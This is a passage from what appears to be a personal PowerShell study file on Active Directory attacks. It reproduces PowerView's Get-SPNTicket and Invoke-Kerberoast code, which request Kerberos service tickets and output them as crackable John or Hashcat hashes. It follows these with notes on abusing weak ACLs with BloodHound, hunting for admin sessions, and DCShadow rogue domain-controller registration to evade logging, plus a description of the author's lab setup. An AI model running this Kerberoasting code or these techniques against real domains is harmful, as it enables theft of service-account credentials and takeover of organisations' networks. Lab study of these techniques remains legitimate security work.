# Properties object to extract out LDAP fields for display.
# 
# .OUTPUTS
# 
# System.Management.Automation.PSCustomObject
# 
# A custom PSObject with LDAP hashtable properties translated.
# #>
# 
#     [OutputType('System.Management.Automation.PSCustomObject')]
#     [CmdletBinding()]
#     Param(
#         [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
#         [ValidateNotNullOrEmpty()]
#         $Properties
#     )
# 
#     $ObjectProperties = @{}
# 
#     $Properties.PropertyNames | ForEach-Object {
#         if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
#             # convert the SID to a string
#             $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0], 0)).Value
#         }
#         elseif ($_ -eq 'objectguid') {
#             # convert the GUID to a string
#             $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
#         }
#         elseif ($_ -eq 'ntsecuritydescriptor') {
#             $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
#         }
#         elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
#             # convert timestamps
#             if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
#                 # if we have a System.__ComObject
#                 $Temp = $Properties[$_][0]
#                 [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
#                 [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
#                 $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
#             }
#             else {
#                 # otherwise just a string
#                 $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
#             }
#         }
#         elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
#             # try to convert misc com objects
#             $Prop = $Properties[$_]
#             try {
#                 $Temp = $Prop[$_][0]
#                 Write-Verbose $_
#                 [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
#                 [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
#                 $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
#             }
#             catch {
#                 $ObjectProperties[$_] = $Prop[$_]
#             }
#         }
#         elseif ($Properties[$_].count -eq 1) {
#             $ObjectProperties[$_] = $Properties[$_][0]
#         }
#         else {
#             $ObjectProperties[$_] = $Properties[$_]
#         }
#     }
# 
#     New-Object -TypeName PSObject -Property $ObjectProperties
# }
# 
# 
# function Get-NetDomain {
# <#
# .SYNOPSIS
# 
# Returns a given domain object.
# 
# Author: Will Schroeder (@harmj0y)
# License: BSD 3-Clause
# Required Dependencies: None
# 
# .DESCRIPTION
# 
# Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
# domain or the domain specified with -Domain X.
# 
# .PARAMETER Domain
# 
# Specifies the domain name to query for, defaults to the current domain.
# 
# .PARAMETER Credential
# 
# A [Management.Automation.PSCredential] object of alternate credentials
# for connection to the target domain.
# 
# .EXAMPLE
# 
# Get-NetDomain -Domain testlab.local
# 
# .OUTPUTS
# 
# System.DirectoryServices.ActiveDirectory.Domain
# 
# .LINK
# 
# http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
# #>
# 
#     [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
#     [CmdletBinding()]
#     Param(
#         [Parameter(Position = 0, ValueFromPipeline = $True)]
#         [ValidateNotNullOrEmpty()]
#         [String]
#         $Domain,
# 
#         [Management.Automation.PSCredential]
#         [Management.Automation.CredentialAttribute()]
#         $Credential = [Management.Automation.PSCredential]::Empty
#     )
# 
#     PROCESS {
#         if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
# 
#             Write-Verbose "Using alternate credentials for Get-NetDomain"
# 
#             if (-not $Domain) {
#                 # if no domain is supplied, extract the logon domain from the PSCredential passed
#                 $TargetDomain = $Credential.GetNetworkCredential().Domain
#                 Write-Verbose "Extracted domain '$Domain' from -Credential"
#             }
#             else {
#                 $TargetDomain = $Domain
#             }
# 
#             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
# 
#             try {
#                 [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
#             }
#             catch {
#                 Write-Verbose "The specified domain does '$TargetDomain' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
#                 $Null
#             }
#         }
#         elseif ($Domain) {
#             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
#             try {
#                 [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
#             }
#             catch {
#                 Write-Verbose "The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust."
#                 $Null
#             }
#         }
#         else {
#             [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
#         }
#     }
# }
# 
# 
# function Get-SPNTicket {
# <#
# .SYNOPSIS
# 
# Request the kerberos ticket for a specified service principal name (SPN).
# 
# Author: @machosec, Will Schroeder (@harmj0y)
# License: BSD 3-Clause
# Required Dependencies: None
# 
# .DESCRIPTION
# 
# This function will either take one/more SPN strings, or one/more PowerView.User objects
# (the output from Get-NetUser) and will request a kerberos ticket for the given SPN
# using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
# portion of the ticket is then extracted and output in either crackable John or Hashcat
# format (deafult of John).
# 
# .PARAMETER SPN
# 
# Specifies the service principal name to request the ticket for.
# 
# .PARAMETER User
# 
# Specifies a PowerView.User object (result of Get-NetUser) to request the ticket for.
# 
# .PARAMETER OutputFormat
# 
# Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
# Defaults to 'John'.
# 
# .EXAMPLE
# 
# Get-SPNTicket -SPN "HTTP/web.testlab.local"
# 
# Request a kerberos service ticket for the specified SPN.
# 
# .EXAMPLE
# 
# "HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-SPNTicket
# 
# Request kerberos service tickets for all SPNs passed on the pipeline.
# 
# .EXAMPLE
# 
# Get-NetUser -SPN | Get-SPNTicket -OutputFormat Hashcat
# 
# Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.
# 
# .INPUTS
# 
# String
# 
# Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.
# 
# .INPUTS
# 
# PowerView.User
# 
# Accepts one or more PowerView.User objects on the pipeline with the User parameter set.
# 
# .OUTPUTS
# 
# PowerView.SPNTicket
# 
# Outputs a custom object containing the SamAccountName, DistinguishedName, ServicePrincipalName, and encrypted ticket section.
# #>
# 
#     [OutputType('PowerView.SPNTicket')]
#     [CmdletBinding(DefaultParameterSetName='RawSPN')]
#     Param (
#         [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
#         [ValidatePattern('.*/.*')]
#         [Alias('ServicePrincipalName')]
#         [String[]]
#         $SPN,
# 
#         [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
#         [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
#         [Object[]]
#         $User,
# 
#         [Parameter(Position = 1)]
#         [ValidateSet('John', 'Hashcat')]
#         [Alias('Format')]
#         [String]
#         $OutputFormat = 'John'
#     )
# 
#     BEGIN {
#         $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
#     }
# 
#     PROCESS {
#         if ($PSBoundParameters['User']) {
#             $TargetObject = $User
#         }
#         else {
#             $TargetObject = $SPN
#         }
# 
#         ForEach ($Object in $TargetObject) {
#             if ($PSBoundParameters['User']) {
#                 $UserSPN = $Object.ServicePrincipalName
#                 $SamAccountName = $Object.SamAccountName
#                 $DistinguishedName = $Object.DistinguishedName
#             }
#             else {
#                 $UserSPN = $Object
#                 $SamAccountName = $Null
#                 $DistinguishedName = $Null
#             }
# 
#             $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
#             $TicketByteStream = $Ticket.GetRequest()
#             if ($TicketByteStream) {
#                 $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
#                 [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
#                 $Parts.RemoveAt($Parts.Count - 1)
#                 $Hash = $Parts -join 'A48201'
#                 $Hash = $Hash.Insert(32, '$')
# 
#                 $Out = New-Object PSObject
#                 $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
#                 $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
#                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
# 
#                 if ($OutputFormat -match 'John') {
#                     $HashFormat = "`$krb5tgs`$unknown:$Hash"
#                 }
#                 else {
#                     # hashcat output format
#                     $HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=proddfs,DC=pf,DC=fakedomain,DC=com SPN: E3514235-4B06-11D1-AB04-00C04FC2DCD2-ADAM/NAKCRA04.proddfs.pf.fakedomain.com:50000 *' + $Hash
#                 }
#                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
# 
#                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
# 
#                 Write-Output $Out
#                 break
#             }
#         }
#     }
# }
# 
# 
# function Invoke-Kerberoast {
# <#
# .SYNOPSIS
# 
# Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.
# 
# Author: Will Schroeder (@harmj0y), @machosec
# License: BSD 3-Clause
# Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty
# 
# .DESCRIPTION
# 
# Implements code from Get-NetUser to quyery for user accounts with non-null service principle
# names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
# The ticket format can be specified with -OutputFormat <John/Hashcat>
# 
# .PARAMETER Identity
# 
# A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
# SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201). 
# Wildcards accepted. By default all accounts will be queried for non-null SPNs.
# 
# .PARAMETER AdminCount
# 
# Switch. Return users with adminCount=1.
# 
# .PARAMETER Domain
# 
# Specifies the domain to use for the query, defaults to the current domain.
# 
# .PARAMETER LDAPFilter
# 
# Specifies an LDAP query string that is used to filter Active Directory objects. 
# 
# .PARAMETER SearchBase
# 
# The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
# Useful for OU queries.
# 
# .PARAMETER Server
# 
# Specifies an Active Directory server (domain controller) to bind to.
# 
# .PARAMETER SearchScope
# 
# Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
# 
# .PARAMETER ResultPageSize
# 
# Specifies the PageSize to set for the LDAP searcher object.
# 
# .PARAMETER Credential
# 
# A [Management.Automation.PSCredential] object of alternate credentials
# for connection to the target domain.
# 
# .PARAMETER OutputFormat
# 
# Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
# Defaults to 'John'.
# 
# .EXAMPLE
# 
# Invoke-Kerberoast | fl
# 
# SamAccountName       : SQLService
# DistinguishedName    : CN=SQLService,CN=Users,DC=testlab,DC=local
# ServicePrincipalName : MSSQLSvc/PRIMARY.testlab.local:1433
# Hash                 : $krb5tgs$unknown:30FFC786BECD0E88992CBBB017155C53$0343A9C8...
# 
# .EXAMPLE
# 
# Invoke-Kerberoast -Domain dev.testlab.local | ConvertTo-CSV -NoTypeInformation
# 
# "SamAccountName","DistinguishedName","ServicePrincipalName","Hash"
# "SQLSVC","CN=SQLSVC,CN=Users,DC=dev,DC=testlab,DC=local","MSSQLSvc/secondary.dev.testlab.local:1433","$krb5tgs$unknown:ECF4BDD1037D1D9E2E091ABBDC92F00E$0F3A4...
# 
# .EXAMPLE
# 
# Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
# 
# SamAccountName       : SQLService
# DistinguishedName    : CN=SQLService,CN=Users,DC=testlab,DC=local
# ServicePrincipalName : MSSQLSvc/PRIMARY.testlab.local:1433
# Hash                 : $krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Se
#                        rvice,OU=Accounts,OU=EnterpriseObjects,DC=proddfs,DC=pf,
#                        DC=fakedomain,DC=com SPN: E3514235-4B06-11D1-AB04-00C04F
#                        C2DCD2-ADAM/NAKCRA04.proddfs.pf.fakedomain.com:50000 *30
#                        FFC786BECD0E88992CBBB017155C53$0343A9C8A7EB90F059CD92B52
#                        ....
# 
# .INPUTS
# 
# String
# 
# Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.
# 
# .OUTPUTS
# 
# PowerView.SPNTicket
# 
# Outputs a custom object containing the SamAccountName, DistinguishedName, ServicePrincipalName, and encrypted ticket section.
# #>
# 
#     [OutputType('PowerView.SPNTicket')]
#     [CmdletBinding()]
#     Param(
#         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
#         [Alias('SamAccountName', 'Name')]
#         [String[]]
#         $Identity,
# 
#         [Switch]
#         $AdminCount,
# 
#         [ValidateNotNullOrEmpty()]
#         [String]
#         $Domain,
# 
#         [ValidateNotNullOrEmpty()]
#         [Alias('Filter')]
#         [String]
#         $LDAPFilter,
# 
#         [ValidateNotNullOrEmpty()]
#         [String]
#         $SearchBase,
# 
#         [ValidateNotNullOrEmpty()]
#         [String]
#         $Server,
# 
#         [ValidateSet('Base', 'OneLevel', 'Subtree')]
#         [String]
#         $SearchScope = 'Subtree',
# 
#         [ValidateRange(1,10000)] 
#         [Int]
#         $ResultPageSize = 200,
# 
#         [Management.Automation.PSCredential]
#         [Management.Automation.CredentialAttribute()]
#         $Credential = [Management.Automation.PSCredential]::Empty,
# 
#         [ValidateSet('John', 'Hashcat')]
#         [Alias('Format')]
#         [String]
#         $OutputFormat = 'John'
#     )
# 
#     BEGIN {
#         $SearcherArguments = @{}
#         if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
#         if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
#         if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
#         if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
#         if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
#         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
#         $UserSearcher = Get-DomainSearcher @SearcherArguments
# 
#         $GetSPNTicketArguments = @{}
#         if ($PSBoundParameters['OutputFormat']) { $GetSPNTicketArguments['OutputFormat'] = $OutputFormat }
# 
#     }
# 
#     PROCESS {
#         if ($UserSearcher) {
#             $IdentityFilter = ''
#             $Filter = ''
#             $Identity | Where-Object {$_} | ForEach-Object {
#                 $IdentityInstance = $_
#                 if ($IdentityInstance -match '^S-1-.*') {
#                     $IdentityFilter += "(objectsid=$IdentityInstance)"
#                 }
#                 elseif ($IdentityInstance -match '^CN=.*') {
#                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
#                 }
#                 else {
#                     try {
#                         $Null = [System.Guid]::Parse($IdentityInstance)
#                         $IdentityFilter += "(objectguid=$IdentityInstance)"
#                     }
#                     catch {
#                         $IdentityFilter += "(samAccountName=$IdentityInstance)"
#                     }
#                 }
#             }
#             if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
#                 $Filter += "(|$IdentityFilter)"
#             }
#             $Filter += '(servicePrincipalName=*)'
# 
#             if ($PSBoundParameters['AdminCount']) {
#                 Write-Verbose 'Searching for adminCount=1'
#                 $Filter += '(admincount=1)'
#             }
#             if ($PSBoundParameters['LDAPFilter']) {
#                 Write-Verbose "Using additional LDAP filter: $LDAPFilter"
#                 $Filter += "$LDAPFilter"
#             }
# 
#             $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
#             Write-Verbose "Invoke-Kerberoast search filter string: $($UserSearcher.filter)"
# 
#             $Results = $UserSearcher.FindAll()
#             $Results | Where-Object {$_} | ForEach-Object {
#                 $User = Convert-LDAPProperty -Properties $_.Properties
#                 $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
#                 $User
#             } | Where-Object {$_.SamAccountName -notmatch 'krbtgt'} | Get-SPNTicket @GetSPNTicketArguments
# 
#             $Results.dispose()
#             $UserSearcher.dispose()
#         }
#     }
# }
#endregion
#endregion
#region AD Permissions: Exploiting Weak Permissions
# Simple attack method is to find groups that have the managed by feature enabled(See that in properties of group)
# This means that the manager can edit the permissions of the group.
# This is kind of negletable but if you have a user that can manage an important group it could be nice.
# Also considering scanning ACLs of Objects in the directory and complexly filtering them is worth looking at.
# SID of 500 is the default admin account
# SID of 512 is domain admins
# SID of 1000 is one of the first sids in the first user in the domain (Non default one) (I tested in AD16)
# SID of 1001 is the first domain controller in the domain                               (I tested in AD16)
# BloodHound with AD:
# https://github.com/BloodHoundAD/BloodHound Open source sick stuff
# Scans for these vulnerabilities ACEs(Access control entry) in an ACL(Access control list) -
# Reset Password – The ability to change the password of a user account without knowing their existing password
# Add Members – Having the ability to add users to a particular group
# Full Control – You can do anything you want to a user or group
# Write Owner / Write DACL – The right to change permissions and ownership over an object
# Write – The ability to write object attributes
# Extended Rights – This controls various extended rights in one permission, including reset password rights
# BloodHound is basicaly a tool of analasis of ACLs to create attack paths with one or more exploited vulnerablities.
# UserHunter is the process of hunting for users and machines in the domains
# In PowerView this is dont like so:
# For Invoke-UserHunter
# The script will first query the members of the target group (“Domain Admins” by default).
# Then the script will query the domain for all machines using Get-NetComputers.
# After the script will perform a Get-NetSessions and Get-NetLoggedOn against every host in the list and look for the users previously queried.
# StealthUserHunter does the same thing but does not target the entire domain, only places that are likely to bring value data(Fileshares and DCs)
#endregion
#endregion
#region DCShadow  - What I Learned
# This method utilizes trusts in the forest in order to infiltrate the target domain.
# Then run your own DC therefore negating the siem(the thing that processes the logs in real time)
# In order to discover the trust relationships in the current domain you are inside you can user a simple query,
# this information is open to any user(including the trusted ones)
# Getting the trust information:
# 1.Get-ADTrust
# 2.nltest.exe /domain_trusts
# 3.can also use dsa.msc query a custom search for trusted domain objects where the value name is present
# Better techniches:
# Method 1:Partition data:
# Every DC contains the configuration partition, this partition stores configuration objects for the entire forest(the same in the whole forest)
# The configuration partition includes the definition of the Domains(AD partitions) in cn=partitions,cn=configuration,dc=forestRootDomain
# This gains the info of the domain list in the forest
# Can also use adsi edit to connect to configuration partition and browse to partitions and then configuration.
# Ive checked with a no privilages user and it can do this
# Method 2: SID lookup
# CN=ForeignSecurityPrincipals - This is a container that holds objects of the class foreignSecurityPrincipal.
# These objects represent security principals from trusted domains external to the forest, and allow foregin security principals to become members of groups within the domain
# SID-History attribute - an attribute that stores the History of the object moving from one domain to another.
# When an object moves from one domain to another the SID must change, therefore there is an attribute that keeps the history of the old seeds.
# If the attribute is empty the object was never moved out of the domain.
# The Tokens created to a user in another domain that has SIDHistory represent both the new and old seeds therefore can access resources in the old domain(with his old SID) and resources in the new domain(with his new SID)
# This method has been created for situations that there is one old domain that is being re-created to a new one but they co-exist in the proccess and new users in the new domain need access to resources still remaining in the old domain
# If you remove the last part of the SID of a foreign user you get the SID of a Foreign Domain
# Then in order to ensure this domain exists you so an SID Translation.
# SIDs are translatble to users and the other way around this way:
# $objUser = New-Object System.Security.Principal.NTAccount("yotam","amish") # First comes the domain name then the user logon name for AD, For local accounts provide just the name of the account
# $strSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier])
# $strSID.Value
# $objSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-1604102931-1806437862-1415400612-1104")
# $objUser = $objSID.Translate( [System.Security.Principal.NTAccount])
# $objUser.Value
# How SIDs work:
# S-1-5-21-1604102931-1806437862-1415400612-1104
# (1) revision level                    - Indicates the version of the SID structure that is used in a particular SID. The structure used in all SIDs that are created by a Windows Server 2003 operating system and earlier versions is revision level 1.
# (5) An identifier authority value     - Identifies the highest level of authority that can issue SIDs for a particular type of security principal.
# (21-1604102931-1806437862-1415400612) - Domain identifier
# (1104)                                - Relative identifier
# Method 3: Domain Locator
# nltest /Server:DC1 /DsGetDC:amish.tamesh
# nltest /Server:DC2 /DsGetDC:yotam.nordman
# This works both ways and gets me a DC from the domain that i asked for by asking a dc in my domain, also gets me the forest name.


# I now have the info needed.
# How to register a DC?
# no need to be a member of the domain controllers group
# 1. A change in the configuration partition
# CN=Configuration,CN=Sites,DC=yotam,DC=nordman,CN=Default-First-Site-Name -> need to create a server with NTDS settings.
# This modification is disabled by default
# DrsAddEntry is not limited to DC registration
# 2. A modification of the SPN of a computer account that the attacker owns
# Running a DC stuff needed
# 1. Imporsonate the computer account to use its SPN
# 2. Run a RPC server listening for minimal APIs (in mimikatz its like DrsGetNCChanges - dcsync)
# 3. Trigger a replication -
# By using DrsReplicaAdd, requires permissions
# Or wait 15 minutes
# mimikatz provides commands to run the rpc server and push changes, and a special wininternals trick to modify the AD database
# Detecting this, using LDP.exe or using repadmin /showobjmeta <DB> <Object>
# There u can see the originating DSA(the dc that did it) and the time
# Tracking Schema changes,
# There is an attribute called schemainfo that can track schema changes
#endregion
#region My Test environmet
#Setup:
# Create 4 VMs - DC1 - winserver16 - DC2 -winserver16 - C1 - win10 1709 - C2 - win10 1709
# All VMs have 2gb ram and 1 core and are at local NAT VMNET 0 stored in a single file not multiple(this is with vmware)
# Drop windows firewall at firewall settings
# Define static ips for all and disable ipv6(it becomes default if its enabled)
# Change the computer name to the name of the VM for comfort
# Set a Default Admin password because it is a prerequisite for promoting to a domain controller
# Promote the 2 DC Machines to domain controllers each in a different forest
# Set the default domain admin password
# In network settings in the client machines use the Corresponding DCs as prefered DNS
# Join the client machines, one into each domain
# Define a DNS stub zone so they can recognize each other in prep of the trust
# Download RSAT(Remote server Administration Tools) KB and install it on client machines
# Checkpoint 1: Shut down all machines for an offline snapshot. Then bring them back on
# If I now ping the counterpart domain name it replies ipv4.
# Now with Active directory domains and trusts, under properties there is the trust wizard
# Created a 2 direction forest trust. and validated on the other side in the same place where the trust wizard is
# After ive validated on the 2nd domain, ive confirmed the end of the wizard in the 1st domain
# Check if i can get the trust with the domain admin account from the client machine:
# ipmo act*
# Get-ADTrust -Filter *
# I get the trust
# Now log on to the same machine with a non privilaged account(only member of domain users) do the same commands:
# I get the trust
# I get also log on with a user from domain 1 to a machine in domain 2
# nltest.exe /domain_trusts works with both privilaged and unprivilaged users.
# Checkpoint 2: Shut down all machines for an offline snapshot. Then bring them back on
#endregion
#TODO Write how to secure string username and password